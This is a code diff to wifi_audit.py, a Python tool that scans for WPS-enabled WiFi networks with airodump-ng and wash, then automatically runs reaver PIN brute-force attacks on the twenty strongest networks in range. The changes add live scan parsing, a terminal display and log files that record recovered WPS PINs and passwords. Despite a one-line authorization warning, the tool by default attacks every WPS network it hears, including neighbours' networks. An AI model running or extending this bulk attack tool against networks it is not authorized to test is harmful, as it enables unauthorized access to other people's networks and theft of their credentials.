@@ -4,25 +4,35 @@ wifi_audit.py
 
 Active WiFi WPS penetration testing tool.
 
-Phase 1: Runs airodump-ng (60s) and wash to scan for WPS-enabled networks
+Phase 1: Scans for WPS-enabled networks (1.0, 2.0, or Locked) using:
+         - airodump-ng (live output parsing)
+         - wash (WPS lock detection)
 Phase 2: Attacks top 20 WPS-enabled targets by signal strength using reaver
 
 Features:
-- Live scan output
+- Live scan output parsing (no CSV files)
+- Strict WPS filtering: only 1.0, 2.0, or Locked networks
+- Union of airodump + wash results
 - Intelligent WPS lock detection and retry logic
 - Association mode fallback (no-association -> direct)
-- Real-time progress tracking
-- Detailed results logging to file and console
+- Real-time progress tracking with curses TUI
+- Results output in both CSV and table format
 
 Usage:
     # Passive scan only (no attacks):
     sudo python3 wifi_audit.py -i wlan0mon --passive
 
-    # Active attack mode (default 60s scan):
+    # Active attack mode (default 480s scan):
     sudo python3 wifi_audit.py -i wlan0mon
 
+    # Use only airodump-ng (skip wash):
+    sudo python3 wifi_audit.py -i wlan0mon --only-airodump
+
+    # Use only wash (skip airodump):
+    sudo python3 wifi_audit.py -i wlan0mon --only-wash
+
     # Custom scan duration:
-    sudo python3 wifi_audit.py -i wlan0mon -d 120
+    sudo python3 wifi_audit.py -i wlan0mon -a 120
 
 Requires:
     - airodump-ng (from aircrack-ng)
@@ -36,10 +46,8 @@ WARNING: Only use on networks you own or have explicit authorization to test.
 """
 
 import argparse
-import csv
 import subprocess
 import time
-import os
 import sys
 import re
 import curses
@@ -79,6 +87,19 @@ class AccessPoint:
 
 
 @dataclass
+class WPSAccessPoint:
+    """WPS-enabled access point from airodump and/or wash scans."""
+    bssid: str
+    channel: str
+    pwr: int
+    essid: str
+    privacy: str
+    wps_version: str  # "1.0", "2.0", or "Locked"
+    wps_locked: bool
+    source: str  # "airodump", "wash", or "both"
+
+
+@dataclass
 class AttackResult:
     target_num: int
     bssid: str
@@ -94,95 +115,142 @@ class AttackResult:
 
 
 # ---------------------------------------------------------
-# CSV Parsing Cache (shared by TUI and helpers)
+# WPS Results Manager
 # ---------------------------------------------------------
 
-class CSVCache:
-    """Cache for airodump CSV parsing to avoid redundant file reads."""
-    __slots__ = ('mtime', 'size', 'count', 'wps_count', 'aps')
+class WPSResultsManager:
+    """Manages union of airodump and wash WPS scan results.
+
+    Only stores entries with WPS 1.0, 2.0, or Locked status.
+    Maintains union - entries from either source are preserved.
+    """
+
+    # Valid WPS versions to capture
+    VALID_WPS = ('1.0', '2.0', 'Locked', 'Lck')
 
     def __init__(self):
-        self.mtime = 0
-        self.size = 0
-        self.count = 0
-        self.wps_count = 0
-        self.aps = []
+        self._results: Dict[str, WPSAccessPoint] = {}  # Keyed by BSSID (uppercase)
 
-_csv_cache = CSVCache()
+    def _normalize_wps(self, wps_value: str) -> tuple:
+        """Normalize WPS value. Returns (wps_version, is_locked) or (None, None) if invalid."""
+        wps = wps_value.strip()
+        if wps in ('Locked', 'Lck'):
+            return ('Locked', True)
+        elif wps == '1.0':
+            return ('1.0', False)
+        elif wps == '2.0':
+            return ('2.0', False)
+        return (None, None)
 
+    def add_from_airodump(self, bssid: str, channel: str, pwr: int,
+                          essid: str, privacy: str, wps_value: str) -> bool:
+        """Add entry from airodump scan. Returns True if added/updated."""
+        wps_version, is_locked = self._normalize_wps(wps_value)
+        if wps_version is None:
+            return False
 
-def parse_csv_cached(csv_file: str) -> tuple:
-    """Parse airodump CSV with caching. Returns (total_count, wps_count, aps_list).
-    Uses file mtime/size to avoid re-parsing unchanged files."""
-    global _csv_cache
+        bssid_key = bssid.upper()
+        if bssid_key in self._results:
+            # Update existing - mark as "both" if was from wash
+            existing = self._results[bssid_key]
+            if existing.source == "wash":
+                self._results[bssid_key] = WPSAccessPoint(
+                    bssid=bssid,
+                    channel=channel,
+                    pwr=pwr,
+                    essid=essid or existing.essid,
+                    privacy=privacy or existing.privacy,
+                    wps_version=wps_version,
+                    wps_locked=is_locked,
+                    source="both"
+                )
+        else:
+            self._results[bssid_key] = WPSAccessPoint(
+                bssid=bssid,
+                channel=channel,
+                pwr=pwr,
+                essid=essid,
+                privacy=privacy,
+                wps_version=wps_version,
+                wps_locked=is_locked,
+                source="airodump"
+            )
+        return True
 
-    if not os.path.exists(csv_file):
-        return (0, 0, [])
+    def add_from_wash(self, bssid: str, channel: str, pwr: int,
+                      essid: str, wps_version: str, locked: bool) -> bool:
+        """Add entry from wash scan. Returns True if added/updated."""
+        # Wash provides version directly, normalize locked status
+        if wps_version not in ('1.0', '2.0') and not locked:
+            return False
 
-    try:
-        stat = os.stat(csv_file)
-        if stat.st_mtime == _csv_cache.mtime and stat.st_size == _csv_cache.size:
-            return (_csv_cache.count, _csv_cache.wps_count, _csv_cache.aps)
+        version = 'Locked' if locked else wps_version
+        bssid_key = bssid.upper()
 
-        # File changed, re-parse
-        count = 0
-        wps_count = 0
-        aps = []
+        if bssid_key in self._results:
+            # Update existing - mark as "both" if was from airodump
+            existing = self._results[bssid_key]
+            if existing.source == "airodump":
+                self._results[bssid_key] = WPSAccessPoint(
+                    bssid=bssid,
+                    channel=channel or existing.channel,
+                    pwr=pwr if pwr != -999 else existing.pwr,
+                    essid=essid or existing.essid,
+                    privacy=existing.privacy,
+                    wps_version=version,
+                    wps_locked=locked,
+                    source="both"
+                )
+            else:
+                # Update wash entry with potentially better data
+                self._results[bssid_key] = WPSAccessPoint(
+                    bssid=bssid,
+                    channel=channel or existing.channel,
+                    pwr=pwr if pwr != -999 else existing.pwr,
+                    essid=essid or existing.essid,
+                    privacy=existing.privacy,
+                    wps_version=version,
+                    wps_locked=locked,
+                    source=existing.source
+                )
+        else:
+            self._results[bssid_key] = WPSAccessPoint(
+                bssid=bssid,
+                channel=channel,
+                pwr=pwr,
+                essid=essid,
+                privacy="",
+                wps_version=version,
+                wps_locked=locked,
+                source="wash"
+            )
+        return True
 
-        with open(csv_file, newline="", encoding="utf-8", errors="ignore") as f:
-            reader = csv.reader(f)
-            in_ap_section = False
+    def get_all_results(self) -> List[WPSAccessPoint]:
+        """Get all WPS results sorted by signal strength (strongest first)."""
+        return sorted(
+            self._results.values(),
+            key=lambda x: x.pwr,
+            reverse=True
+        )
 
-            for row in reader:
-                if not row:
-                    continue
+    def get_count(self) -> int:
+        """Get total count of WPS entries."""
+        return len(self._results)
 
-                if row[0] == "BSSID":
-                    in_ap_section = True
-                    continue
-
-                if in_ap_section:
-                    bssid = row[0].strip() if row else ""
-                    if not bssid or bssid == "Station MAC":
-                        break
-
-                    if ":" in bssid:
-                        count += 1
-                        wps_status = row[14].strip() if len(row) > 14 and row[14] else ""
-                        # WPS can be: version number (1.0, 2.0), "WPS", "Locked", "Lck"
-                        # Any non-empty value except explicit "No" indicates WPS enabled
-                        if wps_status and wps_status not in ("No", ""):
-                            wps_count += 1
-
-                        aps.append({
-                            'bssid': bssid,
-                            'channel': row[3].strip() if len(row) > 3 else '',
-                            'privacy': row[5].strip() if len(row) > 5 else '',
-                            'pwr': row[8].strip() if len(row) > 8 else '',
-                            'essid': row[13].strip() if len(row) > 13 else '',
-                            'wps': wps_status or '?',
-                        })
-
-        # Sort by signal strength (PWR closer to 0 is stronger)
-        aps.sort(key=lambda x: int(x['pwr']) if x['pwr'].lstrip('-').isdigit() else -999, reverse=True)
-
-        # Update cache
-        _csv_cache.mtime = stat.st_mtime
-        _csv_cache.size = stat.st_size
-        _csv_cache.count = count
-        _csv_cache.wps_count = wps_count
-        _csv_cache.aps = aps
-
-        return (count, wps_count, aps)
-
-    except Exception:
-        return (_csv_cache.count, _csv_cache.wps_count, _csv_cache.aps)
-
-
-def count_aps_in_csv(csv_file: str) -> tuple:
-    """Count APs in airodump CSV. Returns (total_count, wps_count)."""
-    count, wps_count, _ = parse_csv_cached(csv_file)
-    return (count, wps_count)
+    def get_as_dict_list(self) -> List[dict]:
+        """Get results as list of dicts for TUI compatibility."""
+        return [
+            {
+                'bssid': ap.bssid,
+                'channel': ap.channel,
+                'pwr': str(ap.pwr),
+                'essid': ap.essid,
+                'privacy': ap.privacy,
+                'wps': ap.wps_version,
+            }
+            for ap in self.get_all_results()
+        ]
 
 
 # ---------------------------------------------------------
@@ -200,6 +268,7 @@ class WifiAuditTUI:
         # Scan phase state for live table display
         self.scan_results = []  # Store discovered APs during scan phase
         self.scan_phase = True  # True during airodump/wash, False during attacks
+        self.wash_started = False  # True once wash scan begins (switches to WPS-only view)
 
         # Initialize curses colors
         try:
@@ -355,21 +424,28 @@ class WifiAuditTUI:
         return y
 
     def draw_scan_table(self, y_offset: int) -> int:
-        """Draw discovered WPS-enabled networks during scan phase. Returns next y position."""
+        """Draw discovered networks during scan phase. Returns next y position.
+
+        Only displays networks with WPS 1.0, 2.0, or Locked status.
+        """
         max_y, max_x = self.stdscr.getmaxyx()
         y = y_offset
 
-        # Filter for confirmed WPS-enabled networks only
-        # WPS can be: version (1.0, 2.0), "WPS", "Locked", "Lck" - anything non-empty except "No" or "?"
-        wps_aps = [ap for ap in self.scan_results if ap.get('wps', '') and ap.get('wps', '') not in ('No', '?', '')]
-        total_wps = len(wps_aps)
+        # Strict filter: only show WPS 1.0, 2.0, or Locked
+        display_aps = [
+            ap for ap in self.scan_results
+            if ap.get('wps', '') in ('1.0', '2.0', 'Locked', 'Lck')
+        ]
+
+        # Count totals for header
+        total_wps = len(display_aps)
 
         try:
             # Calculate available rows
             available_rows = max_y - y - 12  # Reserve space for output window
 
             # Table header
-            header = f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'CH':<3} | {'PWR':<4} | {'ENC':<8} | {'WPS':<5} [WPS targets: {total_wps}]"
+            header = f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'CH':<3} | {'PWR':<4} | {'ENC':<8} | {'WPS':<6} [WPS 1.0/2.0/Locked: {total_wps}]"
             self.stdscr.addstr(y, 0, header[:max_x - 1], curses.A_BOLD)
             y += 1
 
@@ -378,7 +454,7 @@ class WifiAuditTUI:
             y += 1
 
             # Show rows (as many as fit)
-            for idx, ap in enumerate(wps_aps[:available_rows]):
+            for idx, ap in enumerate(display_aps[:available_rows]):
                 num = f"{idx + 1}"
 
                 # Show placeholder for hidden networks
@@ -391,17 +467,15 @@ class WifiAuditTUI:
                 channel = ap.get('channel', '')[:3]
                 pwr = str(ap.get('pwr', ''))[:4]
                 enc = ap.get('privacy', '')[:8]
-                wps = ap.get('wps', '?')[:5]
+                wps = ap.get('wps', '?')[:6]
 
                 # Color based on WPS status
                 if wps in ('Locked', 'Lck'):
                     color = curses.color_pair(3)  # Yellow - WPS locked
-                elif wps and wps not in ('No', '?', ''):
-                    color = curses.color_pair(1)  # Green - WPS enabled
                 else:
-                    color = 0
+                    color = curses.color_pair(1)  # Green - WPS 1.0/2.0
 
-                row = f"{num:<3} | {essid:<20} | {bssid:<17} | {channel:<3} | {pwr:<4} | {enc:<8} | {wps:<5}"
+                row = f"{num:<3} | {essid:<20} | {bssid:<17} | {channel:<3} | {pwr:<4} | {enc:<8} | {wps:<6}"
                 self.stdscr.addstr(y, 0, row[:max_x - 1], color)
                 y += 1
 
@@ -510,23 +584,52 @@ def check_monitor_mode(interface: str) -> bool:
         return False
 
 
-def run_airodump(interface: str, duration: int, prefix: str, tui=None) -> str:
-    """Run airodump-ng for `duration` sec and save CSV."""
-    csv_path = f"{prefix}-01.csv"
+def run_airodump_live(interface: str, duration: int, results_manager: WPSResultsManager,
+                      tui=None) -> None:
+    """Run airodump-ng and parse live output for WPS 1.0/2.0/Locked networks.
 
-    tui_print(f"[+] Running airodump-ng for {duration} seconds...", tui)
+    Parses stdout directly instead of CSV file. Only captures networks with
+    WPS version 1.0, 2.0, or Locked status.
+    """
+    import select
 
-    # Run airodump in background (it needs a TTY for display, so we suppress output)
+    tui_print(f"[+] Running airodump-ng for {duration} seconds (WPS 1.0/2.0/Locked only)...", tui)
+
+    # Run airodump-ng with --wps flag, capture stdout
+    # Use --berlin 0 to disable hop timeout warnings
     proc = subprocess.Popen(
         ["sudo", "timeout", str(duration),
-         "airodump-ng", "--wps", "--write", prefix, "--output-format", "csv", interface],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
+         "airodump-ng", "--wps", "-a", "--berlin", "0", interface],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        bufsize=1
     )
 
-    # Show progress bar while scanning
+    # Regex to strip ANSI escape codes
+    ansi_escape = re.compile(r'\x1b\[[0-9;]*[a-zA-Z]|\x1b\[[\?0-9;]*[a-zA-Z]')
+
+    # Regex pattern to parse airodump output line
+    # Format: BSSID  PWR  Beacons  #Data  #/s  CH  MB  ENC  CIPHER  AUTH  WPS  ESSID
+    # Example: AA:BB:CC:DD:EE:FF  -45  100  50  0  6  54e  WPA2  CCMP  PSK  2.0  NetworkName
+    ap_pattern = re.compile(
+        r'^([0-9A-Fa-f:]{17})\s+'  # BSSID
+        r'(-?\d+)\s+'              # PWR
+        r'\d+\s+'                  # Beacons
+        r'\d+\s+'                  # #Data
+        r'\d+\s+'                  # #/s
+        r'(\d+)\s+'                # CH (channel)
+        r'[\d\w.e-]+\s+'           # MB (speed)
+        r'(\S*)\s*'                # ENC (encryption)
+        r'(\S*)\s*'                # CIPHER
+        r'(\S*)\s*'                # AUTH
+        r'([\d.]+|Locked|Lck|No|)\s*'  # WPS
+        r'(.*)$'                   # ESSID
+    )
+
     start = time.time()
     bar_width = 40
+    total_scanned = 0
+
     while proc.poll() is None:
         elapsed = int(time.time() - start)
         progress = min(elapsed / duration, 1)
@@ -534,12 +637,46 @@ def run_airodump(interface: str, duration: int, prefix: str, tui=None) -> str:
         bar = "█" * filled + "░" * (bar_width - filled)
         percent = int(progress * 100)
 
-        # Parse CSV once (cached) - gets counts and AP list in single call
-        ssid_count, wps_count, aps = parse_csv_cached(csv_path)
+        # Try to read available output (non-blocking)
+        try:
+            ready, _, _ = select.select([proc.stdout], [], [], 0.1)
+            if ready:
+                line = proc.stdout.readline()
+                if line:
+                    decoded = line.decode(errors='ignore')
+                    # Strip ANSI codes
+                    clean_line = ansi_escape.sub('', decoded).strip()
 
-        msg = f"[SCAN] |{bar}| {percent}% ({elapsed}/{duration}s) | SSIDs: {ssid_count} (WPS: {wps_count})"
+                    # Skip header lines
+                    if not clean_line or 'BSSID' in clean_line or 'PWR' in clean_line:
+                        continue
+
+                    # Try to parse AP line
+                    match = ap_pattern.match(clean_line)
+                    if match:
+                        bssid, pwr, channel, enc, cipher, auth, wps, essid = match.groups()
+                        total_scanned += 1
+
+                        # Only add if WPS is 1.0, 2.0, or Locked
+                        if wps in ('1.0', '2.0', 'Locked', 'Lck'):
+                            pwr_int = int(pwr) if pwr else -999
+                            results_manager.add_from_airodump(
+                                bssid=bssid,
+                                channel=channel,
+                                pwr=pwr_int,
+                                essid=essid.strip(),
+                                privacy=enc,
+                                wps_value=wps
+                            )
+        except Exception:
+            pass
+
+        # Update progress bar
+        wps_count = results_manager.get_count()
+        msg = f"[SCAN] |{bar}| {percent}% ({elapsed}/{duration}s) | WPS 1.0/2.0/Locked: {wps_count}"
+
         if tui and tui.enabled:
-            tui.scan_results = aps  # Direct assignment, already sorted
+            tui.scan_results = results_manager.get_as_dict_list()
             tui.update_progress_line(msg, "[SCAN]")
             dummy_stats = {'total': 0, 'completed': 0, 'success': 0, 'failed': 0, 'locked': 0}
             tui.refresh_display([], dummy_stats)
@@ -548,7 +685,33 @@ def run_airodump(interface: str, duration: int, prefix: str, tui=None) -> str:
 
         if elapsed >= duration:
             break
-        time.sleep(0.5)
+        time.sleep(0.3)
+
+    # Read any remaining output
+    try:
+        remaining_out, _ = proc.communicate(timeout=2)
+        if remaining_out:
+            for line in remaining_out.decode(errors='ignore').splitlines():
+                clean_line = ansi_escape.sub('', line).strip()
+                if not clean_line or 'BSSID' in clean_line:
+                    continue
+                match = ap_pattern.match(clean_line)
+                if match:
+                    bssid, pwr, channel, enc, cipher, auth, wps, essid = match.groups()
+                    if wps in ('1.0', '2.0', 'Locked', 'Lck'):
+                        pwr_int = int(pwr) if pwr else -999
+                        results_manager.add_from_airodump(
+                            bssid=bssid,
+                            channel=channel,
+                            pwr=pwr_int,
+                            essid=essid.strip(),
+                            privacy=enc,
+                            wps_value=wps
+                        )
+    except subprocess.TimeoutExpired:
+        proc.kill()
+    except Exception:
+        pass
 
     proc.wait()
 
@@ -558,84 +721,25 @@ def run_airodump(interface: str, duration: int, prefix: str, tui=None) -> str:
 
     if not (tui and tui.enabled):
         print()  # Newline for legacy mode
-    tui_print("[+] Finished airodump scan.", tui)
-    return csv_path
+
+    wps_count = results_manager.get_count()
+    tui_print(f"[+] Finished airodump scan. Found {wps_count} WPS 1.0/2.0/Locked networks.", tui)
 
 
-def parse_airodump_csv(csv_file: str) -> Dict[str, AccessPoint]:
-    """Parse APs from airodump CSV."""
-    aps = {}
+def run_wash(interface: str, duration: int, results_manager: WPSResultsManager,
+             tui=None) -> None:
+    """Run wash and add WPS 1.0/2.0/Locked networks to results manager.
 
-    with open(csv_file, newline="", encoding="utf-8", errors="ignore") as f:
-        reader = csv.reader(f)
-        in_ap_section = False
-
-        for row in reader:
-            if not row:
-                continue
-
-            if row[0] == "BSSID":
-                in_ap_section = True
-                continue
-
-            if in_ap_section:
-                if len(row) < 14:
-                    continue
-
-                try:
-                    bssid = row[0].strip()
-                    channel = row[3].strip()
-                    privacy = row[5].strip()
-                    cipher = row[6].strip()
-                    auth = row[7].strip()
-                    pwr = row[8].strip()
-                    essid = row[13].strip()
-                    # Extract WPS data from column 14 (if available with --wps flag)
-                    wps_status = row[14].strip() if len(row) > 14 else ""
-                except:
-                    continue
-
-                if not bssid or bssid == "Station MAC":
-                    break
-
-                pwr = int(pwr) if pwr not in ("", "NA") else -999
-
-                # Parse WPS status from airodump --wps output
-                # Possible values: version (1.0, 2.0), "Locked"/"Lck" (locked), "No" (disabled), "" (unknown)
-                if wps_status in ["Locked", "Lck"]:
-                    wps = "Yes"
-                    locked = "Yes"
-                elif wps_status == "No" or wps_status == "":
-                    wps = "No" if wps_status == "No" else "?"
-                    locked = "No" if wps_status == "No" else "?"
-                elif wps_status:
-                    # Any other value (1.0, 2.0, "WPS", etc.) means WPS is enabled
-                    wps = "Yes"
-                    locked = "No"
-                else:
-                    wps = "?"
-                    locked = "?"
-
-                aps[bssid] = AccessPoint(
-                    bssid=bssid,
-                    pwr=pwr,
-                    channel=channel,
-                    essid=essid,
-                    privacy=privacy,
-                    cipher=cipher,
-                    auth=auth,
-                    wps=wps,
-                    locked=locked,
-                )
-
-    return aps
-
-
-def run_wash(interface: str, duration: int = 120, tui=None) -> Dict[str, Dict[str, str]]:
-    """Run wash and collect WPS + Locked data."""
+    Parses wash output and adds entries with WPS 1.0, 2.0, or Locked status.
+    Maintains union with airodump results - does not remove existing entries.
+    """
     import select
 
-    tui_print(f"[+] Running wash for {duration} seconds (WPS lock validation)...", tui)
+    # Switch TUI to WPS-only view mode
+    if tui and tui.enabled:
+        tui.wash_started = True
+
+    tui_print(f"[+] Running wash for {duration} seconds (WPS 1.0/2.0/Locked only)...", tui)
 
     # Run wash in background with line-buffered output
     proc = subprocess.Popen(
@@ -648,8 +752,45 @@ def run_wash(interface: str, duration: int = 120, tui=None) -> Dict[str, Dict[st
     # Show progress bar while scanning, reading output incrementally
     start = time.time()
     bar_width = 40
-    output_lines = []
-    wps_found = 0
+
+    def parse_wash_line(line: str) -> bool:
+        """Parse a wash output line and add to results. Returns True if added."""
+        # Wash output format:
+        # BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
+        # AA:BB:CC:DD:EE:FF   6  -45  1.0  No   Unknown   NetworkName
+        if ":" not in line or "BSSID" in line:
+            return False
+
+        parts = line.split()
+        if len(parts) < 6:
+            return False
+
+        try:
+            bssid = parts[0]
+            channel = parts[1]
+            rssi = parts[2]
+            wps_ver = parts[3]
+            locked_str = parts[4]
+            # ESSID is everything after vendor (parts[5])
+            essid = ' '.join(parts[6:]) if len(parts) > 6 else ''
+
+            # Only add if WPS is 1.0, 2.0, or Locked
+            is_locked = locked_str.lower() == 'yes'
+            if wps_ver not in ('1.0', '2.0') and not is_locked:
+                return False
+
+            pwr = int(rssi) if rssi.lstrip('-').isdigit() else -999
+
+            return results_manager.add_from_wash(
+                bssid=bssid,
+                channel=channel,
+                pwr=pwr,
+                essid=essid,
+                wps_version=wps_ver,
+                locked=is_locked
+            )
+        except (ValueError, IndexError):
+            return False
 
     while proc.poll() is None:
         elapsed = int(time.time() - start)
@@ -660,34 +801,22 @@ def run_wash(interface: str, duration: int = 120, tui=None) -> Dict[str, Dict[st
 
         # Try to read any available output (non-blocking)
         try:
-            # Use select to check if data is available (Unix only)
             ready, _, _ = select.select([proc.stdout], [], [], 0.1)
             if ready:
                 line = proc.stdout.readline()
                 if line:
-                    decoded_line = line.decode(errors='ignore')
-                    output_lines.append(decoded_line)
-                    # Count if it's a valid WPS line (has BSSID in first 17 chars)
-                    if len(decoded_line) > 17 and ":" in decoded_line[:17]:
-                        wps_found += 1
-                        # Update scan_results with confirmed WPS status
-                        bssid = decoded_line[:17].strip()
-                        if tui and tui.enabled and tui.scan_results:
-                            for ap in tui.scan_results:
-                                if ap.get('bssid', '').upper() == bssid.upper():
-                                    # Check if locked (Lck column or Yes in lock column)
-                                    if 'Lck' in decoded_line or 'Yes' in decoded_line:
-                                        ap['wps'] = 'Locked'
-                                    else:
-                                        ap['wps'] = 'WPS'
-                                    break
-        except:
+                    decoded_line = line.decode(errors='ignore').strip()
+                    parse_wash_line(decoded_line)
+        except Exception:
             pass
 
-        msg = f"[WASH] |{bar}| {percent}% ({elapsed}/{duration}s) | Confirmed WPS: {wps_found}"
+        # Update progress bar
+        wps_count = results_manager.get_count()
+        msg = f"[WASH] |{bar}| {percent}% ({elapsed}/{duration}s) | WPS 1.0/2.0/Locked: {wps_count}"
+
         if tui and tui.enabled:
+            tui.scan_results = results_manager.get_as_dict_list()
             tui.update_progress_line(msg, "[WASH]")
-            # Refresh display to show progress during scan
             dummy_stats = {'total': 0, 'completed': 0, 'success': 0, 'failed': 0, 'locked': 0}
             tui.refresh_display([], dummy_stats)
         else:
@@ -695,27 +824,15 @@ def run_wash(interface: str, duration: int = 120, tui=None) -> Dict[str, Dict[st
 
         if elapsed >= duration:
             break
-        time.sleep(0.4)  # Slightly shorter sleep to be more responsive
+        time.sleep(0.3)
 
     # Read any remaining output
     try:
         remaining = proc.stdout.read()
         if remaining:
             for line in remaining.decode(errors='ignore').splitlines():
-                output_lines.append(line)
-                if len(line) > 17 and ":" in line[:17]:
-                    wps_found += 1
-                    # Update scan_results with confirmed WPS status
-                    bssid = line[:17].strip()
-                    if tui and tui.enabled and tui.scan_results:
-                        for ap in tui.scan_results:
-                            if ap.get('bssid', '').upper() == bssid.upper():
-                                if 'Lck' in line or 'Yes' in line:
-                                    ap['wps'] = 'Locked'
-                                else:
-                                    ap['wps'] = 'WPS'
-                                break
-    except:
+                parse_wash_line(line.strip())
+    except Exception:
         pass
 
     proc.wait()
@@ -727,29 +844,8 @@ def run_wash(interface: str, duration: int = 120, tui=None) -> Dict[str, Dict[st
     if not (tui and tui.enabled):
         print()  # New line after progress bar for legacy mode
 
-    # Process the collected output
-    output = "\n".join(output_lines)
-
-    wps_data = {}
-
-    for line in output.splitlines():
-        if ":" not in line or "BSSID" in line:
-            continue
-
-        parts = line.split()
-        if len(parts) < 6:
-            continue
-
-        bssid = parts[0]
-        wps_ver = parts[3]
-        locked = parts[4]
-
-        wps_data[bssid] = {
-            "wps": wps_ver,
-            "locked": locked,
-        }
-
-    return wps_data
+    wps_count = results_manager.get_count()
+    tui_print(f"[+] Finished wash scan. Total WPS 1.0/2.0/Locked: {wps_count}", tui)
 
 
 def detect_wps_lock(output_line: str) -> bool:
@@ -865,7 +961,8 @@ def update_targets_table(results: List[AttackResult], stats: Dict, tui=None):
 
 def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackResult,
                       stats: Dict, all_results: List[AttackResult],
-                      max_retries: int = 10, verbose: bool = False, tui=None) -> AttackResult:
+                      max_retries: int = 10, verbose: bool = False, tui=None,
+                      log_file=None) -> AttackResult:
     """
     Run reaver against a single target with lock detection/retry logic.
     Updates result_obj in real-time for live progress display.
@@ -875,6 +972,14 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
     use_no_association = True
 
     tui_print(f"[+] Starting attack on {target.essid} ({target.bssid})", tui)
+
+    # Write target header to log file
+    if log_file:
+        log_file.write(f"\n{'='*80}\n")
+        log_file.write(f"TARGET: {target.essid} ({target.bssid}) - Channel {target.channel}\n")
+        log_file.write(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        log_file.write(f"{'='*80}\n\n")
+        log_file.flush()
 
     while retry_count <= max_retries:
         # Build reaver command
@@ -917,6 +1022,11 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
                     break
 
                 if line:
+                    # Write ALL output to log file (complete reaver output)
+                    if log_file:
+                        log_file.write(line)
+                        log_file.flush()
+
                     # Determine if we should print this line based on verbose mode
                     should_print = verbose
 
@@ -1003,6 +1113,16 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
                 result_obj.retries = retry_count
                 result_obj.pin_progress = 100
                 update_targets_table(all_results, stats, tui)
+
+                # Log success summary
+                if log_file:
+                    log_file.write(f"\n--- RESULT: SUCCESS ---\n")
+                    log_file.write(f"WPS PIN: {wps_pin}\n")
+                    log_file.write(f"Password: {password or '-'}\n")
+                    log_file.write(f"Time: {int(elapsed)}s | Retries: {retry_count}\n")
+                    log_file.write(f"Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+                    log_file.flush()
+
                 return result_obj
 
             # Handle association failure - switch modes
@@ -1026,6 +1146,15 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
                     result_obj.time_spent = elapsed
                     result_obj.retries = retry_count
                     update_targets_table(all_results, stats, tui)
+
+                    # Log locked summary
+                    if log_file:
+                        log_file.write(f"\n--- RESULT: LOCKED ---\n")
+                        log_file.write(f"Max retries ({max_retries}) reached\n")
+                        log_file.write(f"Time: {int(elapsed)}s | Retries: {retry_count}\n")
+                        log_file.write(f"Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+                        log_file.flush()
+
                     return result_obj
             else:
                 # Failed for other reasons
@@ -1048,6 +1177,14 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
     result_obj.time_spent = elapsed
     result_obj.retries = retry_count
     update_targets_table(all_results, stats, tui)
+
+    # Log failed summary
+    if log_file:
+        log_file.write(f"\n--- RESULT: FAILED ---\n")
+        log_file.write(f"Time: {int(elapsed)}s | Retries: {retry_count}\n")
+        log_file.write(f"Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+        log_file.flush()
+
     return result_obj
 
 
@@ -1083,6 +1220,88 @@ def print_table(aps: List[AccessPoint]):
             ap.status.ljust(10),
         ]
         print("  " + "  ".join(row))
+
+
+def wps_to_access_point(wps_ap: WPSAccessPoint) -> AccessPoint:
+    """Convert WPSAccessPoint to AccessPoint for attack phase."""
+    return AccessPoint(
+        bssid=wps_ap.bssid,
+        pwr=wps_ap.pwr,
+        channel=wps_ap.channel,
+        essid=wps_ap.essid,
+        privacy=wps_ap.privacy,
+        cipher="",
+        auth="",
+        wps="Yes",
+        locked="Yes" if wps_ap.wps_locked else "No",
+        status="PENDING"
+    )
+
+
+def write_wps_results_csv(results: List[WPSAccessPoint], filename: str) -> str:
+    """Write WPS scan results to CSV file.
+
+    Args:
+        results: List of WPSAccessPoint objects
+        filename: Base filename (without extension)
+
+    Returns:
+        Full path to created CSV file
+    """
+    import csv
+    csv_filename = f"{filename}.csv"
+
+    with open(csv_filename, 'w', newline='') as f:
+        writer = csv.writer(f)
+        writer.writerow(['BSSID', 'Channel', 'PWR', 'ESSID', 'Privacy',
+                        'WPS Version', 'WPS Locked', 'Source'])
+        for ap in results:
+            writer.writerow([
+                ap.bssid,
+                ap.channel,
+                ap.pwr,
+                ap.essid,
+                ap.privacy,
+                ap.wps_version,
+                'Yes' if ap.wps_locked else 'No',
+                ap.source
+            ])
+
+    return csv_filename
+
+
+def write_wps_results_table(results: List[WPSAccessPoint], filename: str) -> str:
+    """Write WPS scan results as formatted table to file.
+
+    Args:
+        results: List of WPSAccessPoint objects
+        filename: Base filename (without extension)
+
+    Returns:
+        Full path to created table file
+    """
+    table_filename = f"{filename}.txt"
+
+    with open(table_filename, 'w') as f:
+        # Header
+        f.write(f"WiFi WPS Scan Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write(f"Total WPS 1.0/2.0/Locked targets: {len(results)}\n")
+        f.write("=" * 110 + "\n\n")
+
+        # Table header
+        header = f"{'#':<3} | {'BSSID':<17} | {'CH':<3} | {'PWR':<4} | {'ESSID':<25} | {'WPS':<6} | {'Locked':<6} | {'Source':<10}"
+        f.write(header + "\n")
+        f.write("-" * 110 + "\n")
+
+        # Rows
+        for i, ap in enumerate(results, 1):
+            essid_display = ap.essid[:25] if ap.essid else '<Hidden>'
+            row = f"{i:<3} | {ap.bssid:<17} | {ap.channel:<3} | {ap.pwr:<4} | {essid_display:<25} | {ap.wps_version:<6} | {'Yes' if ap.wps_locked else 'No':<6} | {ap.source:<10}"
+            f.write(row + "\n")
+
+        f.write("-" * 110 + "\n")
+
+    return table_filename
 
 
 def save_results_to_file(results: List[AttackResult], interface: str, filename: str):
@@ -1152,32 +1371,35 @@ def run_main_logic(args, tui=None):
         sys.exit(1)
     tui_print(f"[+] Interface {args.interface} is in monitor mode", tui)
 
